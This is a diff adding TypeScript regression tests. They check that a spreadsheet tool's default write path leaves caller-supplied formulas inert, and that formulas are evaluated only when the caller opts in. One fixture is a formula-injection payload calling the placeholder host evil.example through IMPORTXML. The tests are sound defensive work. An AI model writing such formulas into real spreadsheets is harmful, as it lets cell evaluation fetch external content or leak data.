@@ -436,3 +436,92 @@ describe("formula guard ignores leading invisible characters", () => {
     });
   });
 });
+
+/**
+ * THE PIN. SCRUM-46 fixed caller text being evaluated as a formula; SCRUM-121
+ * asked to make the write mode selectable, and the obvious way to do that is
+ * to hand the default to whoever is next in a hurry.
+ *
+ * These assert the PROPERTY — a formula-prefixed value supplied by the caller
+ * is not evaluated unless the caller asked for it — rather than the mechanism
+ * that currently delivers it. That distinction is deliberate. The property is
+ * what SCRUM-46 bought and it must survive any future change of mechanism,
+ * whether that is the apostrophe escape shipped in fc0ce41, a switch to RAW,
+ * or an explicit value_input_option. A test pinned to `valueInputOption ===
+ * "USER_ENTERED"` alone would pass a refactor that kept the constant and
+ * dropped the guard, which is exactly the regression worth catching.
+ */
+describe("PIN: the default write path never evaluates caller text", () => {
+  it.each([
+    ["sheets_update", { spreadsheet_id: "s", range: "A1" }],
+    ["sheets_append", { spreadsheet_id: "s" }],
+  ])("%s leaves a formula inert by default", async (toolName, base) => {
+    const { client, calls } = fakeClient([{ data: {} }]);
+
+    await handleSheets(client, toolName, {
+      ...base,
+      values: [["=IMPORTXML(\"https://evil.example\",\"//x\")", "+1+1"]],
+    });
+
+    const sent = (calls[0].jsonBody as { values: string[][] }).values[0];
+    const mode = (calls[0].params as { valueInputOption?: string }).valueInputOption;
+
+    // Whatever the mechanism, one of these two must hold for every value the
+    // caller supplied: it is stored literally (RAW), or it is neutralised
+    // before it is sent (the apostrophe escape).
+    for (const value of sent) {
+      const inert = mode === "RAW" || value.startsWith("'");
+      expect(
+        inert,
+        `"${value}" would be evaluated: valueInputOption=${mode} and the value is unescaped`
+      ).toBe(true);
+    }
+  });
+
+  it("evaluates a formula only when the caller names the opt-out", async () => {
+    const { client, calls } = fakeClient([{ data: {} }]);
+
+    await handleSheets(client, "sheets_update", {
+      spreadsheet_id: "s",
+      range: "A1",
+      values: [["=1+1"]],
+      parse_formulas: true,
+    });
+
+    // The opt-out has to actually reach Google in an evaluating mode,
+    // otherwise "you can write a formula" is a claim the tool cannot honour.
+    expect(calls[0].params).toMatchObject({ valueInputOption: "USER_ENTERED" });
+    expect(calls[0].jsonBody).toEqual({ values: [["=1+1"]] });
+  });
+});
+
+describe("sheets_read value_render_option", () => {
+  it("omits the parameter entirely when the caller does not set it", async () => {
+    const { client, calls } = fakeClient([{ data: { values: [["a"]] } }]);
+    await handleSheets(client, "sheets_read", { spreadsheet_id: "s", range: "A1" });
+    expect(calls[0].params).not.toHaveProperty("valueRenderOption");
+  });
+
+  it.each(["FORMATTED_VALUE", "UNFORMATTED_VALUE", "FORMULA"])(
+    "passes %s through to the API",
+    async (option) => {
+      const { client, calls } = fakeClient([{ data: { values: [["a"]] } }]);
+      await handleSheets(client, "sheets_read", {
+        spreadsheet_id: "s",
+        range: "A1",
+        value_render_option: option,
+      });
+      expect(calls[0].params).toMatchObject({ valueRenderOption: option });
+    }
+  );
+
+  it("offers FORMULA, which is what makes a write verifiable", () => {
+    // Without this, a caller cannot tell a live formula from text that looks
+    // like one — which is how SCRUM-121 item 1 came to be filed backwards.
+    const read = sheetsTools.find((t) => t.name === "sheets_read");
+    const option = read?.inputSchema.properties.value_render_option as {
+      enum?: string[];
+    };
+    expect(option?.enum).toContain("FORMULA");
+  });
+});
